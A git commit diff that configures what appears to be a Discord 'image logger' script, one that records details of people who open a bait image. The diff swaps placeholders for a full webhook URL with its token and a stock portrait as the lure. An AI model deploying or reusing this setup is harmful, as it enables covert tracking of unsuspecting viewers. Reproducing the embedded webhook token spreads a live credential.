bfab1e0cb721fbe359ef633d90d922c70d2a907e
CursedM4 <139590170+CursedM4@users.noreply.github.com>
2026-05-10 11:11:10 -0500

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1503066293803155689/UMHIHYWNciSIZkpnYzTZ4_Z4goLlI-aasiSbcxnZ_jWo-gC_i0vcvKiqOss9ItTwXzTK",
+    "image": "https://img.freepik.com/premium-photo/portrait-young-confident-guy-with-stylish-hairdo-casual-white-tshirt-standing-looking-camera-with-attentive-focused-serious-expression-indoor-studio-shot-isolated-blue-background_416530-28399.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
